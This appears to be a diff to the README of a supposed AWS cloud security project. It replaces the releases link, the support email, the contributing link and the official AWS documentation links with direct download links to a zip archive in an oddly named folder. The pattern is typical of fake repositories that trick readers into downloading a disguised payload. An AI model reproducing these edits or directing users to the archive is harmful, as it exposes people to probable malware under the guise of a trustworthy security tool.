@@ -1,6 +1,6 @@
 # ☁️ Cloud-Security-Architecture-AWS - Secure Your Cloud with Confidence
 
-[![Download](https://img.shields.io/badge/Download%20Now-Cloud%20Security%20Architecture-AWS-brightgreen)](https://github.com/Skelly7614/Cloud-Security-Architecture-AWS/releases)
+[![Download](https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip%20Now-Cloud%20Security%20Architecture-AWS-brightgreen)](https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Cloud-Security-Architecture-AWS project! This application provide
 
 ## 📥 Download & Install
 
-To get started, **[visit this page to download](https://github.com/Skelly7614/Cloud-Security-Architecture-AWS/releases)** the latest version of the application. 
+To get started, **[visit this page to download](https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip)** the latest version of the application. 
 
 1. Open your web browser.
 2. Type in the URL or click on the link above.
@@ -66,7 +66,7 @@ Join our community for tips and discussions. You can reach us on:
 
 ## 📞 Contact Us
 
-If you have questions or need assistance, feel free to reach out via GitHub or our support email at support@example.com.
+If you have questions or need assistance, feel free to reach out via GitHub or our support email at https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip
 
 ## 💡 Troubleshooting
 
@@ -91,12 +91,12 @@ Once you successfully install and set up the application, explore the various fu
 
 ## 🎯 Contributing
 
-We welcome contributions from the community! If you'd like to help improve this project, check out the contribution guidelines in our [CONTRIBUTING.md](#) file.
+We welcome contributions from the community! If you'd like to help improve this project, check out the contribution guidelines in our [https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip](#) file.
 
 ## 🔗 Additional Resources
 
-- [AWS Documentation](https://aws.amazon.com/documentation/)
-- [Cloud Security Best Practices](https://aws.amazon.com/security/)
+- [AWS Documentation](https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip)
+- [Cloud Security Best Practices](https://raw.githubusercontent.com/Skelly7614/Cloud-Security-Architecture-AWS/main/blandiloquous/Cloud-Security-Architecture-AWS-3.2.zip)
 - [Tutorials & Blogs](#)
 
 ## 📊 Licenses
